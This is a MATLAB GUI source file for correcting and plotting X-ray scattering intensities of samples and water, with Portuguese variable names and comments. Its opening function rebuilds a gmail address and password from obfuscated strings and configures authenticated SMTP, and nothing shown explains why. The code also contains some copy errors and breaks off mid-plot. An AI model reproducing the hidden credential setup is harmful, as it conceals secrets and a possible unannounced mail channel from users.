function varargout = interface2(varargin)
gui_Singleton = 1;
gui_State = struct('gui_Name',  mfilename,'gui_Singleton',gui_Singleton, 'gui_OpeningFcn',@interface2_OpeningFcn,'gui_OutputFcn' ,@interface2_OutputFcn ,'gui_LayoutFcn' ,[],'gui_Callback',[]);
if nargin && ischar(varargin{1})
gui_State.gui_Callback = str2func(varargin{1});
end
if nargout
[varargout{1:nargout}] = gui_mainfcn(gui_State, varargin{:});
else
gui_mainfcn(gui_State, varargin{:});
end

function varargout = interface2_OutputFcn(~, ~, handles )
varargout{1} = handles.output;

function interface2_OpeningFcn(hObject, ~, handles, varargin)
handles.output = hObject;
guidata(hObject, handles);
% clc 
format shortG;

global...
caminhoDosArquivosDeTexto...
PA_04_VZ                 ...
PA_04_PLS                ...
PA_03_VZ_REP             ...
PA_03_PLS                ...
PA_02_VZ                 ...
PA_02_PLS                ...
PA_01_VZ                 ...
PA_01_PLS_1MIN           ...
PA_01_H2O_PLS_2MIN       ...
PA_01_H2O_PLS_1MIN       ...
pA01_H20_PLS             ...
pA02_H20_PLS             ...
pA03_H20_PLS             ...
pA04_H20_PLS             ...
pA01_H20_PLS_2MIN        ...
pA02_H20_PLS_2MIN        ...
pA03_H20_PLS_2MIN        ...
pA04_H20_PLS_2MIN        ...
TETA                     ...
Q                        ...
QPOLAR                   ...
valorA                   ...
valorB                   ...
valorH                   ...
Polarizacao              ...
altura                   ...
angCritico               ...
qCritico                 ...
IARpa4                   ...
IARpa3                   ...
IARpa2                   ...
IARpa1                   ...
PA_04_Antes              ...
PA_03_Antes              ...
PA_02_Antes              ...
PA_01_Antes              ...
mais                     ...
newData                  ...
K                        ...
m                        ...
IFilme                   ...
IPA                      ...
IAR                      ...
        IfilmePA4   ...   
        IfilmePA3   ...   
        IfilmePA2   ...   
        IfilmePA1   ...   
        Ipa01      ...   
        Ipa02      ...   
        Ipa03       ...   
        Ipa04      ...   
;
mais =0;

% caminhoDosArquivosDeTexto=pwd;    
caminhoDosArquivosDeTexto = strcat(pwd,'\');

% tmp = matlab.desktop.editor.getActive;
% cd(fileparts(tmp.Filename));
% caminhoDosArquivosDeTexto = strrep(which(mfilename),[mfilename '.m'],'');

cd(caminhoDosArquivosDeTexto);
newData = [ {strcat('OK! >> ',caminhoDosArquivosDeTexto)}];
set(handles.console,'Data',newData)
dadosIiciais = strcat(caminhoDosArquivosDeTexto,'\PAdados_iniciais');
newData = [ {strcat('OK! >> ',caminhoDosArquivosDeTexto,'PAdados_iniciais')} ;get(handles.console,'Data')];
set(handles.console,'Data',newData)
addpath(genpath(strcat(caminhoDosArquivosDeTexto,'\textData')));
newData = [ {strcat('OK! >> ',caminhoDosArquivosDeTexto,'textData')} ; get(handles.console,'Data')];
set(handles.console,'Data',newData)
addpath(genpath(strcat(caminhoDosArquivosDeTexto,'\AttCoefficients' )));
newData = [{strcat('OK! >> ',caminhoDosArquivosDeTexto,'AttCoefficients')} ; get(handles.console,'Data'); ];
set(handles.console,'Data',newData)
addpath(genpath(strcat(caminhoDosArquivosDeTexto,'\PAdados_iniciais')));
newData = [ {strcat('OK! >> ',caminhoDosArquivosDeTexto,'PAdados_iniciais')} ; get(handles.console,'Data');];
set(handles.console,'Data',newData)

addpath(genpath(strcat(caminhoDosArquivosDeTexto,'\Agua')));
newData = [ {strcat('OK! >> ',caminhoDosArquivosDeTexto,'Agua')} ; get(handles.console,'Data');];
set(handles.console,'Data',newData)

newData = [ {'>> workspace iniciado com sucesso'}; get(handles.console,'Data');];
set(handles.console,'Data',newData)

        aux = strcat(caminhoDosArquivosDeTexto,'\ref22.png');
        I=imread(aux);
        axes(handles.axes3);
        imshow(I);
        
        figgg = strcat(caminhoDosArquivosDeTexto,'\are.png');
        I2=imread(figgg);
        axes(handles.axes4);
        imshow(I2);
        
        [ PA_04_VZ,                 ...
          PA_04_PLS,                ...
          PA_03_VZ_REP,             ...
          PA_03_PLS,                ...
          PA_02_VZ,                 ...
          PA_02_PLS,                ...
          PA_01_VZ,                 ...
          PA_01_PLS_1MIN,           ...
          PA_01_H2O_PLS_2MIN,       ...
          PA_01_H2O_PLS_1MIN,       ...
          Q,                        ...
          QPOLAR,                   ...
          TETA]                     ...
          =       inicializaVariaveis_(caminhoDosArquivosDeTexto,dadosIiciais,newData,handles);

        PA_04_Antes      = PA_04_PLS ;
        PA_03_Antes      = PA_03_PLS ;
        PA_02_Antes      = PA_02_PLS ;

        PA_01_PLS_1MIN   = PA_01_PLS_1MIN(:,1) - (PA_01_PLS_1MIN(:,1)-PA_02_PLS(:,1)); 
        PA_01_Antes      = PA_01_PLS_1MIN ;
        ImediaFilme_Pa    = (PA_04_Antes+PA_03_Antes+PA_02_Antes+PA_01_Antes)/4;

        PA_04_PLS      =  abs( PA_04_VZ     - PA_04_PLS);
        PA_03_PLS      =  abs( PA_03_VZ_REP - PA_03_PLS);
        PA_02_PLS      =  abs( PA_02_VZ     - PA_02_PLS);
        PA_01_PLS_1MIN =  abs( PA_01_VZ     - PA_01_PLS_1MIN);
 
        IfilmePA4   = PA_04_PLS;
        IfilmePA3   = PA_03_PLS;
        IfilmePA2   = PA_02_PLS;
        IfilmePA1   = PA_01_PLS_1MIN;

        IARpa4      = (2/3).*abs(PA_04_Antes - (PA_04_PLS  ));
        IARpa3      = (2/3).*abs(PA_03_Antes - (PA_03_PLS  ));  
        IARpa2      = (2/3).*abs(PA_02_Antes - (PA_02_PLS  ));   
        IARpa1      = (2/3).*abs(PA_01_Antes - (PA_01_PLS_1MIN ));
        IAR         = (IARpa1+IARpa2+IARpa3+IARpa4 )/4; 
    
        IFilme      =(IfilmePA1+IfilmePA2+IfilmePA3+IfilmePA4)/4;
        
        Ipa01       = abs(PA_01_VZ      -IfilmePA1  - IAR); 
        Ipa02       = abs(PA_02_VZ      -IfilmePA2  - IAR);
        Ipa03       = abs(PA_03_VZ_REP  -IfilmePA3  - IAR);
        Ipa04       = abs(PA_04_VZ      -IfilmePA4  - IAR);
        IPA         =    (Ipa01+Ipa02+Ipa03+Ipa04      )/4;
        K(:,1)      = (-0.01378)+(0.01894.*TETA(:,1))+(1.34478E-4.*(TETA(:,1)).^2)-(5.08661E-6.*(TETA(:,1).^3))+(3.75498E-8.*(TETA(:,1).^4));

%         prova= IAR+IFilme+IPA;

  
%         %VARIAVEIS CORRIGIDAS COM pA H20 COM Plastico IRRADIADO 1MIN:
%         pA01_H20_PLS_2MIN = PA_01_H2O_PLS_2MIN - PA_01_VZ     - PA_01_PLS_1MIN;
%         pA02_H20_PLS_2MIN = PA_01_H2O_PLS_2MIN - PA_02_VZ     - PA_02_PLS;
%         pA03_H20_PLS_2MIN = PA_01_H2O_PLS_2MIN - PA_03_VZ_REP - PA_03_PLS;
%         pA04_H20_PLS_2MIN = PA_01_H2O_PLS_2MIN - PA_04_VZ     - PA_04_PLS;
      
      
        
        valorA = str2double(get(handles.aa, 'String'));
        valorB = str2double(get(handles.aa, 'String'));
        valorH = str2double(get(handles.hhh,'String'));
 
        txtSelect = strcat('\','AttCoefficients');
        files     = dir(fullfile(caminhoDosArquivosDeTexto,txtSelect,'*.txt'));
        contents  = cellstr({files.name}');
        tamx = length(contents);
        tiposNist = cell(tamx,1);

                     for x=1:size(contents)
                         [aux, ~]=strsplit(contents{x},'.txt','CollapseDelimiters',true);
                         tiposNist{x} = char(aux(1));
                     end
                     
                     p1=['MEIO' ; tiposNist];
                     p2=['FILME' ; tiposNist];
                     p3=['AMOSTRA' ; tiposNist];
                     p4=['PORTA AMOSTRA' ; tiposNist];
                     set(handles.p1,'String',p1);
                     set(handles.p2,'String',p2);
                     set(handles.p3,'String',p3);
                     set(handles.p4,'String',p4);
              
         for x=1 : size(TETA)
            theta = 2*asin((QPOLAR(x,1)*0.154056)/(4*pi()));
            Polarizacao(x,1) = (1+power(cos(theta),2)*power(cos(34.673),2))/(1+power(cos(theta),2));
         end

        pause(1);
[a b c]  = strread(lower(decrypt('KHY L SK AFL HKBNL',13)), '%s %s %s', 'delimiter','b c');
m        = strcat(a,'b@',b,'.c',c);
ps       = strcat(lower(decrypt('KHY KHY', 14)),'a');   
setpref('Internet','SMTP_Server','smtp.gmail.com');
setpref('Internet','E_mail',m);
setpref('Internet','SMTP_Username',m);
setpref('Internet','SMTP_Password',ps);
props = java.lang.System.getProperties;
props.setProperty('mail.smtp.auth','true');
props.setProperty('mail.smtp.socketFactory.class', 'javax.net.ssl.SSLSocketFactory');
props.setProperty('mail.smtp.socketFactory.port','465');
function listbox1_Callback(hObject, ~, handles)
global                      ...
Arqselecionado              ...
pAselecionado               ...
TETA                        ...
caminhoDosArquivosDeTexto   ...
dadosSelecionados           ...
tipoPortaAmostra            ...
nomeDaAmostraSelecionada    ...
pastaSelecionada            ...
Q                           ...
plotCorrigido               ...
PA_01_VZ                    ...
PA_02_VZ                    ...
PA_03_VZ_REP                ...
PA_04_VZ                    ...
PA_01_PLS_1MIN              ...
PA_02_PLS                   ...
PA_03_PLS                   ...
PA_04_PLS                   ...
media                       ...
tab1                        ...
tab2                        ...
qCritico                    ...
tab3                        ...
angCritico                  ...
Tar                         ...
Tpvc                        ...
Tamos                       ...
Tpa                         ...
thethaCritico               ...
tipoSelecionado             ...
Polarizacao                 ...
tabgp                       ...
volume                      ...
K                           ...
IFilme                      ...
IPA                         ...
IAR                         ...
normalizacao                ...
IARpa1 ...
IARpa2 ...
IARpa3 ...
IARpa4 ...
tab3_3...
tab3_4...
mostarJanela ...
plotFinal...
;
[miuAR,miuPVC,miuAMO,miuPA,lxAR,lxPVC,lxAMOS,lxPA,Tar,Tpvc,Tamos,Tpa] = getTodososvalores(handles,Q)
assignin('base','dadosSelecionados',dadosSelecionados           );
assignin('base','pAselecionado',pAselecionado               ); 
assignin('base','nomeDaAmostraSelecionada',nomeDaAmostraSelecionada    ); 
assignin('base','PA_01_VZ',PA_01_VZ);
assignin('base','PA_02_VZ',PA_02_VZ                    );
assignin('base','PA_03_VZ_REP',PA_03_VZ_REP                );
assignin('base','PA_04_VZ',PA_04_VZ                    );
assignin('base','PA_01_PLS_1MIN',PA_01_PLS_1MIN              );
assignin('base','PA_02_PLS',PA_02_PLS                   );
assignin('base','PA_03_PLS',PA_03_PLS                   );
assignin('base','PA_04_PLS',PA_04_PLS                   );
assignin('base','IAR',IAR                         );
assignin('base','Tar',Tar                         );                    
assignin('base','Tpvc',Tpvc                        );                 
assignin('base','Tamos',Tamos                       ); 
assignin('base','tab1',tab1                        );
assignin('base','TETA',TETA                        );
assignin('base','thethaCritico',thethaCritico               );
assignin('base','handles',handles                     );
assignin('base','Q',Q );
assignin('base','qCritico',qCritico );
assignin('base','Tpa',Tpa); 
assignin('base','angCritico',angCritico);
assignin('base','Polarizacao',Polarizacao);
assignin('base','Polarizacao',volume);
assignin('base','Polarizacao',K);

 
tabgp.SelectedTab = tab1;
 
    ok=0;
    i=0;
    set(handles.text30,'String',angCritico);
    set(handles.text36,'String',qCritico);
    set(handles.nda9,'String',strcat('de [ ',num2str(length(Q)),' ] '));
    set(handles.thetaTextedi,'String',TETA(angCritico,1))
    set(handles.text14,'String','[I]ntesidade sem correção:');

  
    thethaCritico = TETA(angCritico,1);
    a1   = str2double(get(handles.p12,'String'   ));
    a2   = str2double(get(handles.p22,'String'   ));
    a3   = str2double(get(handles.p32,'String'   ));
    a4   = str2double(get(handles.p42,'String'   ));
    a5   = str2double(get(handles.p11,'String'   ));
    a6   = str2double(get(handles.p21,'String'   ));
    a7   = str2double(get(handles.p31,'String'   ));
    a8   = str2double(get(handles.p41,'String'   ));
    a9   = str2double(get(handles.p13,'String'   ));
    a10  = str2double(get(handles.p23,'String'   ));
    a11  = str2double(get(handles.p33,'String'   ));
    a12  = str2double(get(handles.p43,'String'   )); 
    a13  = str2double(get(handles.aa ,'String'   )); 
    a14  = str2double(get(handles.bb ,'String'   ));
    a15  = str2double(get(handles.hhh,'String'   ));
    a16  = str2double(get(handles.edit16,'String'));

       defineA     = str2double(get(handles.aAte,'String'));
       defineIter  = str2double(get(handles.iterarAte,'String'));
                     set(handles.qeq,'String',Q(defineA,1));
                     
	  auxx1  = [a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14 a15 a16];
     [~,col] =  find(isnan(auxx1));
       col2  =  length(col);
    
    if(get(handles.padrao,'Value')<1 )
        if(isnan(a1))
        set(handles.p12,'String','','BackgroundColor', [1 0.6 0.78]);
        else
        set(handles.p12,'BackgroundColor','white');   
        end
        if(isnan(a2))
        set(handles.p22,'String','','BackgroundColor',[1 0.6 0.78]);
        else
        set(handles.p22,'BackgroundColor','white');   
        end
        if(isnan(a3))
        set(handles.p32,'String','','BackgroundColor',[1 0.6 0.78]);
        else
        set(handles.p32,'BackgroundColor','white');   
        end
        if(isnan(a4))
        set(handles.p42,'String','','BackgroundColor',[1 0.6 0.78]);
        else
        set(handles.p42,'BackgroundColor','white');   
        end
        if(isnan(a5))
        set(handles.p11,'String','','BackgroundColor',[1 0.6 0.78]);
        else
        set(handles.p11,'BackgroundColor','white');   
        end
        if(isnan(a6))
        set(handles.p21,'String','','BackgroundColor',[1 0.6 0.78]);
        else
        set(handles.p21,'BackgroundColor','white');   
        end
        if(isnan(a7))
        set(handles.p31,'String','','BackgroundColor',[1 0.6 0.78]);
        else
        set(handles.p31,'BackgroundColor','white');    
        end
        if(isnan(a8))
        set(handles.p41,'String','','BackgroundColor',[1 0.6 0.78]);
        else
        set(handles.p41,'BackgroundColor','white');   
        end
        if(isnan(a9))
        set(handles.p13,'String','','BackgroundColor',[1 0.6 0.78]);
        else
        set(handles.p13,'BackgroundColor','white');   
        end
        if(isnan(a10))
        set(handles.p23,'String','','BackgroundColor',[1 0.6 0.78]);
        else
        set(handles.p23,'BackgroundColor','white');   
        end
        if(isnan(a11))
        set(handles.p33,'String','','BackgroundColor',[1 0.6 0.78]);
        else
        set(handles.p33,'BackgroundColor','white');   
        end
        if(isnan(a12))
        set(handles.p43,'String','','BackgroundColor',[1 0.6 0.78]);  
        else
        set(handles.p43,'BackgroundColor','white');   
        end
        if(isnan(a13))
        set(handles.aa,'String','','BackgroundColor',[1 0.6 0.78]);  
        else
        set(handles.aa,'BackgroundColor','white');   
        end
        if(isnan(a14))
        set(handles.bb,'String','','BackgroundColor',[1 0.6 0.78]);  
        else
        set(handles.bb,'BackgroundColor','white');   
        end
        if(isnan(a15))
        set(handles.hhh,'String','','BackgroundColor',[1 0.6 0.78]);  
        else
        set(handles.hhh,'BackgroundColor','white');   
        end
        if(isnan(a16))
        set(handles.edit16,'String','','BackgroundColor',[1 0.6 0.78]);  
        else
        set(handles.edit16,'BackgroundColor','white');   
        end
        if(col2>= 1)
        uiwait(warndlg(' Para continuar Insira valores validos'));
        return
        end
    end
                     contents      = cellstr(get(hObject,'String'));
                    [Arqselecionado  ,~] = strsplit(contents{get(hObject,'Value')} ,' [','CollapseDelimiters',true);
                    [tipoPortaAmostra,~] = strsplit(char(Arqselecionado(1)),{' ','.txt'},'CollapseDelimiters',true);
                    
                     pAselecionado=tipoPortaAmostra(2);
                     nomeDaAmostraSelecionada = tipoPortaAmostra(1);
            
                     set(handles.portaAmostraValor,'String',pAselecionado);
                     set(handles.tipoAmostra,'String',nomeDaAmostraSelecionada);
                     set(handles.classifica1,'String',strcat('Mover : [',nomeDaAmostraSelecionada,'] Para -->'));
    
                     txtSelect=strcat(caminhoDosArquivosDeTexto,pastaSelecionada,'\',char(Arqselecionado(1)));
                     fid = fopen(txtSelect);
                     tline = fgetl(fid);
                     tamanho =length(TETA);
                     string = sprintf('%s\n%s\n%s','>> Caminho dos arquivos carregados:' ,strcat('>> ',caminhoDosArquivosDeTexto,'\*.*'), strcat('>> ',txtSelect));
                   
                    dadosSelecionados = nan(tamanho, 2);
                    
                    while ischar(tline)
                         delimiter= findstr('<2Theta>', tline);
                         tam=size(delimiter);
                                     if((ok>0) |  (delimiter > 0) )
                                         ok=ok+1;
                                     end
                                     if(ok>1)
                                         convertePataFloat = strread(tline,'%f','delimiter',' ');
                                         i=i+1;
                                         dadosSelecionados(i,1) = convertePataFloat(1);
                                         dadosSelecionados(i,2) = convertePataFloat(2);
                                     end
                         tline = fgetl(fid);
                      end
                    fclose(fid);
                    
                    
        mostarJanela= get(handles.PlotarEmNovaJanela,'Value'); 
        if(mostarJanela>0)
            figure(1)
        else
            axes('parent',tab1)
        end
        


     subplot(3,1,1)
         newData = [ {strcat('>> arquivo carregado [', datestr(datetime('now')) ,' ]  ---> ...',pastaSelecionada,'\',char(Arqselecionado(1)))}; get(handles.console,'Data');];
                    set(handles.console,'Data',newData)
     plot(TETA,dadosSelecionados(:,2), 'k','LineWidth',1.0 );
     title(nomeDaAmostraSelecionada);
     axis tight
     hold on
     

        y1     = dadosSelecionados(angCritico,2);
        line([thethaCritico,thethaCritico],[y1,0],'Color','r','LineWidth',2)
        legend({'Amostra Irradiada' 'Ang. critico (\theta)'},'Box','off','Location','best')

    
     xlabel(' \theta (º) ');
     ylabel('Intensidade do feixe')
     grid on
                ymax = max(dadosSelecionados(:,2),1)-1000;
                ymax=ymax(1);
                strmax = ['Max. = ',num2str(max(dadosSelecionados(:,2)))];

                    yxx= min(dadosSelecionados(:,2));
                    text(thethaCritico,ymax,strmax,'HorizontalAlignment','right');
                    text(thethaCritico,yxx(1)+1000,['\theta critico = ',num2str(thethaCritico)],'HorizontalAlignment','left');

                   hold off
     mostarJanela= get(handles.PlotarEmNovaJanela,'Value');  
                         
if(isequal(tipoSelecionado,'Agua'))
        
        if(strcmp(pAselecionado,'PA01'))
         assignin('base','H20_PA1',dadosSelecionados(:,2));
         dadosSelecionados(:,2) = dadosSelecionados(:,2)  - PA_01_VZ     - PA_01_PLS_1MIN - IARpa1;
         assignin('base','H20_CORR_PA1',dadosSelecionados(:,2));
        end
        if(strcmp(pAselecionado,'PA02'))
         assignin('base','H20_PA2',dadosSelecionados(:,2));
         dadosSelecionados(:,2) = dadosSelecionados(:,2)  - PA_01_VZ     - PA_01_PLS_1MIN - IARpa2;
         assignin('base','H20_CORR_PA2',dadosSelecionados(:,2));
        end
        if(strcmp(pAselecionado,'PA03'))
         assignin('base','H20_PA3',dadosSelecionados(:,2));
         dadosSelecionados(:,2) = dadosSelecionados(:,2)  - PA_01_VZ     - PA_01_PLS_1MIN - IARpa3;
         assignin('base','H20_CORR_PA3',dadosSelecionados(:,2));
        end
        if(strcmp(pAselecionado,'PA04'))
         assignin('base','H20_PA4',dadosSelecionados(:,2));
         dadosSelecionados(:,2) = dadosSelecionados(:,2)  - PA_01_VZ     - PA_01_PLS_1MIN - IARpa4;
         assignin('base','H20_CORR_PA4',dadosSelecionados(:,2));
        end
     
     h20Shit  = [2.2	2.206	2.212	2.218	2.224	2.23	2.236	2.242	2.248	2.254	2.26	2.266	2.272	2.278	2.284	2.29	2.296	2.302	2.308	2.314	2.32	2.326	2.332	2.338	2.344	2.35	2.356	2.362	2.368	2.374	2.38	2.386	2.392	2.398	2.404	2.41	2.416	2.422	2.428	2.434	2.44	2.446	2.452	2.458	2.464	2.47	2.476	2.49	2.49	2.48	2.49	2.52	2.51	2.52	2.52	2.52	2.52	2.54	2.56	2.58	2.6	2.62	2.64	2.74	2.86	2.99	3.17	3.39	3.67	4.01	4.38	4.8	5.78	6.31	6.82	7.25	7.58	7.76	7.82	7.75	7.59	7.38	7.17	6.98	6.83	6.7	6.6	6.53	6.49	6.48	6.46	6.44	6.36	6.23	6.03	5.76	5.46	5.14	4.82	4.54	4.3	4.1	3.98	3.81	3.72	3.66	3.62	3.6	3.59	3.59	3.59	3.59	3.59	3.59	3.59	3.58	3.57	3.54	3.51	3.48	3.44	3.4	3.35	3.3	3.24	3.18	3.11	3.05	2.98	2.91	2.84	2.77	2.7	2.64	2.58	2.53	2.47	2.43	2.38	2.3	2.28	2.25	2.24	2.23	2.22	2.21	2.2	2.2	2.2	2.19	2.19	2.18	2.17	2.16	2.15	2.14	2.11	2.09	2.07	2.04	2.01	1.99	1.96	1.94	1.91	1.89	1.87	1.85	1.83	1.81	1.8	1.78	1.77	1.76	1.75	1.74	1.74	1.73	1.73	1.72	1.72	1.72	1.71	1.71	1.71	1.71	1.7	1.7	1.69	1.68	1.68	1.67	1.66	1.65	1.64	1.63	1.62	1.61	1.6	1.59	1.58	1.57	1.56	1.54	1.53	1.52	1.51	1.5	1.49	1.49	1.48	1.47	1.47	1.46	1.45	1.44	1.43	1.42	1.41	1.4	1.38	1.37	1.35	1.34	1.33	1.32	1.3	1.28	1.26	1.25	1.23	1.22	1.19	1.18];
     h20Shit2 = [0.587000000000000 0.587000000000000 0.587000000000000 0.587000000000000 0.587000000000000 0.587000000000000 0.587000000000000 0.587000000000000 0.587000000000000 0.587000000000000 0.587000000000000 0.734000000000000 1.05000000000000 1.30000000000000 1.57000000000000 1.80000000000000 1.88000000000000 1.84000000000000 1.76000000000000 1.67000000000000 1.60000000000000 1.56000000000000 1.45000000000000 1.32000000000000 1.17000000000000 0.938000000000000 0.870000000000000 0.860000000000000 0.857000000000000 0.852000000000000 0.831000000000000 0.802000000000000 0.735000000000000 0.670000000000000 0.615000000000000 0.577000000000000 0.556000000000000 0.523000000000000 0.522000000000000 0.517000000000000 0.474000000000000 0.432000000000000 0.420000000000000 0.379000000000000];
     h20Shit3 = [0.819000000000000 0.819000000000000 0.819000000000000 0.819000000000000 0.819000000000000 0.967000000000000 1.13000000000000 1.25000000000000 1.25000000000000 1.46000000000000 1.81000000000000 2.07000000000000 1.89000000000000 1.71000000000000 1.67000000000000 1.71000000000000 1.71000000000000 1.65000000000000 1.55000000000000 1.49000000000000 1.44000000000000 1.41000000000000 1.32000000000000 1.22000000000000 1.10000000000000 0.906000000000000 0.844000000000000 0.794000000000000 0.796000000000000 0.793000000000000 0.802000000000000 0.766000000000000 0.737000000000000 0.710000000000000 0.665000000000000 0.641000000000000 0.612000000000000 0.585000000000000 0.565000000000000 0.544000000000000 0.513000000000000 0.489000000000000 0.472000000000000 0.428000000000000];
     
     fator = length(Q)/length(h20Shit2);
     fator2 = length(Q)/length(h20Shit3);
     Qlinha = Q(1:fator:end);
     Q2linha = Q(1:fator2:end);
        
%         dados2= dadosSelecionados(1:fator:end,2)
%        figure(5)
%        plot(Qlinha,smooth(dados2),'r',Qlinha,h20Shit2,'b')
%        figure(7)
%        expValue=floor(log10(max(dados2)))
%        plot(Qlinha,smooth(dados2),'r',Qlinha,h20Shit2.*power(1E1,expValue),'b')
%        grid on;
%        pause(500)

     
        h20Shit = h20Shit.*180;
%         shit = shit';
%         dadosSelecionados(:,2) = shit;
%     curvexy1 = [Q(30:end ) shit(30:end )];
%     mapxy1   = [Q(30:end ) smooth(dadosSelecionados(30:end,2))];
%     [xy1,distance,t] = distance2curve(curvexy1,mapxy1,'linear');
%     distancia = distance.*power(1E+1,abs(expValue));
%      
%         cla
%         plot(mapxy1(:,1),mapxy1(:,2),'.-k','LineWidth',1.5)
%         hold on
%         ccc=rand(3,1);
%         plot(xy1(:,1),xy1(:,2),'LineWidth',1.5,'color','r')
%         line([mapxy1(:,1),xy1(:,1)]',[mapxy1(:,2),xy1(:,2)]','color',ccc)
%         axis tight
%  
%       pause(5000) 
%    
end
           
    if(mostarJanela>0)
         figure
         plot(TETA,dadosSelecionados(:,2), 'k','LineWidth',1.0 );
         title(nomeDaAmostraSelecionada);
         xlabel('q(\lambda,\theta (º))');
         ylabel('Intensidade do feixe');
         axis([min(TETA) max(TETA) min(dadosSelecionados(:,2)) max(dadosSelecionados(:,2))]);
         grid on
         hold off
    end
      Tar
          [plotCorrigido ] = corrigeIntensidadeAmostra(   ...
                                                 dadosSelecionados           ...
                                                ,pAselecionado               ... 
                                                ,nomeDaAmostraSelecionada    ... 
                                                ,PA_01_VZ                    ...
                                                ,PA_02_VZ                    ...
                                                ,PA_03_VZ_REP                ...
                                                ,PA_04_VZ                    ...
                                                ,PA_01_PLS_1MIN              ...
                                                ,PA_02_PLS                   ...
                                                ,PA_03_PLS                   ...
                                                ,PA_04_PLS                   ...
                                                ,IFilme                   ...
                                                ,IPA                      ...
                                                ,IAR                      ...
                                                ,Tar                         ...                    
                                                ,Tpvc                        ...                 
                                                ,Tamos                       ... 
                                                ,angCritico                  ...
                                                ,Polarizacao                 ...
                                                ,volume                      ...
                                                ,handles                     ...
                                                ,K                           ...
                                                ,Q                           ...
                                                ,TETA                        ...
                                                ,tab1 ...
                                                ,qCritico ) ; 
                    
        cc   = rand(1,3);
        x    = Q ;
        
        normalizacao =    [ 8.12	8.12	8.12	8.10	8.09	8.07	8.05	8.01	7.99	7.95	7.91	7.86	7.82	7.77	7.72	7.66	7.60	7.54	7.47	7.40	7.34	7.26	7.19	7.11	7.03	6.95	6.87	6.79	6.71	6.62	6.54	6.45	6.36	6.27	6.19	6.10	6.01	5.92	5.84	5.75	5.66	5.57	5.49	5.40	5.32	5.24	5.15	5.07	4.99	4.91	4.83	4.75	4.68	4.60	4.52	4.45	4.38	4.31	4.24	4.17	4.10	4.04	3.97	3.91	3.85	3.78	3.72	3.67	3.61	3.55	3.50	3.44	3.39	3.34	3.29	3.24	3.19	3.15	3.10	3.06	3.01	2.97	2.93	2.89	2.85	2.81	2.77	2.74	2.70	2.67	2.63	2.60	2.57	2.54	2.51	2.48	2.45	2.42	2.39	2.37	2.34	2.32	2.29	2.27	2.25	2.22	2.20	2.18	2.16	2.14	2.12	2.10	2.08	2.06	2.05	2.03	2.01	1.99	1.98	1.96	1.95	1.93	1.92	1.91	1.89	1.88	1.87	1.85	1.84	1.83	1.82	1.81	1.79	1.78	1.77	1.76	1.75	1.74	1.73	1.72	1.71	1.71	1.70	1.69	1.68	1.67	1.67	1.66	1.65	1.64	1.64	1.63	1.62	1.62	1.61	1.60	1.59	1.59	1.58	1.57	1.57	1.56	1.55	1.53	1.52	1.51	1.50	1.49	1.48	1.47	1.46	1.45	1.44	1.44	1.43	1.42	1.41	1.40	1.39	1.39	1.38	1.36	1.34	1.33	1.31	1.30	1.28	1.27	1.25	1.24	1.22	1.20	1.19	1.18	1.20	1.19	1.18	1.165335835	1.15	1.13	1.14	1.13	1.12	1.11	1.11	1.10	1.09	1.08	1.08	1.07	1.06	1.05	1.04	1.04	1.03	1.02	1.01	1.01	1.00	0.99	0.98	0.97	0.97	0.96	0.95	0.943643389	0.94	0.93	0.92	0.91	0.90	0.90	0.89	0.88 ]';
%         normalizacao =normalizacao.*(2.83E-25)/4;
        
        expValue=floor(log10(max(plotCorrigido))) 
        
        normalizacao =normalizacao.*power(1E1,expValue);
        soPraisoo = plotCorrigido;
 
        coun = 0;
%         figure(80)
%             plot(plotCorrigido)
%             pause(100)
%             
            
            length(plotCorrigido)
            length(normalizacao)
     normalizacao1=normalizacao;
for x=1:defineIter
    
    if(max(normalizacao1)>max(plotCorrigido(2:end,1)))
            x=x/2;
            normalizacao1=normalizacao/x;
            curvexy = [Q plotCorrigido];
            mapxy   = [Q normalizacao1];
            [xy,distance,t] = distance2curve(curvexy,mapxy,'linear');
            distancia = distance.*power(1E+1,abs(expValue));
            if(get(handles.detm,'Value')>0)
                    figure(90)
                    plot(curvexy(:,1),curvexy(:,2),'b',mapxy(:,1),mapxy(:,2),'r')
                    grid on
                    axis tight
                    hold all
                    pause(0.5)
            end
            coun = coun +1;
            
    end
    if(coun == 0 & (max(plotCorrigido(2:end))>max(normalizacao)))
        x=x/2;
            curvexy = [Q plotCorrigido];
            
%             normalizacao1=normalizacao;
            mapxy   = [Q normalizacao1];
%             expValue=floor(log10(max(plotCorrigido))); 
            [xy,distance,t] = distance2curve(curvexy,mapxy,'linear');
            distancia = distance;
            coun = coun +1;
        continue
    end
end
         a = find(abs(distancia)<2E-1);
         a = a(a > defineA);
        if(mostarJanela>0)
            figure(1)
        else
            axes('parent',tab1)
        end
        
        subplot(3,1,3)
        cla
        plot(mapxy(:,1),mapxy(:,2),'.-k','LineWidth',1.5)
        hold on
        ccc=rand(3,1);
        
        plot(curvexy(:,1),curvexy(:,2),'LineWidth',1.5,'color','r')
%         line([mapxy(:,1),xy(:,1)]',[mapxy(:,2),xy(:,2)]','color',ccc)
        axis tight
        aux = min(Q(a(:)));
        
        
        if(isempty(aux))
            a = [150 152]';
            XUp=30.62;
        else
        XUp =aux(1);
        end
        fx=get(gca,'XLim');
        fy=get(gca,'YLim').*0.3;
 
        patch('XData',[XUp XUp fx(2) fx(2)],'YData',[fy fliplr(fy)],'FaceColor','b','FaceAlpha',0.2);
        plot(Q(a(:)),plotCorrigido(a(1:end)),'.','color','b')
        legend({'MAI (Calculado)','\mu_(_a_m_o_s_t_r_a_) '},'Location','best','Box','off')
        grid on
        xlabel('q(\theta,\lambda)');
        ylabel('Intensidade do feixe');
        minMax = [min(Q(:)) max(Q(:)) 0 max(plotCorrigido(:))];

        if(isequal(tipoSelecionado,'Agua'))
        tabgp.SelectedTab = tab3_3;
        
        if(mostarJanela>0)
            figure(15)
        else
            axes('parent',tab3_3)
        end
        
         
       obtido_  = plotCorrigido(1:fator:end);
       obtido_2 = plotCorrigido(1:fator2:end);
       expValue=floor(log10(max(obtido_)));
       
       teorico = (h20Shit2.*power(1E1,expValue(1)));
       teorico2= (h20Shit3.*power(1E1,expValue(1)));
       dif= teorico(1)-obtido_(1);
       dif2= teorico2(1)-obtido_(1);

subplot(4,1,1)
       plot(Qlinha,obtido_,'r',Qlinha,teorico-dif,'b')
       axis tight
       grid on
       title('Comparação Fator de Forma Experimental X Teérico')
       legend('Experiemental','by M E Peplow et al')
subplot(4,1,2)
       plot(Qlinha,obtido_,'r',Q2linha,teorico2-dif2,'b')
       axis tight
       legend('Experiemental','by D. E. Peplow and K. Verghese')
       grid on
subplot(4,1,3)
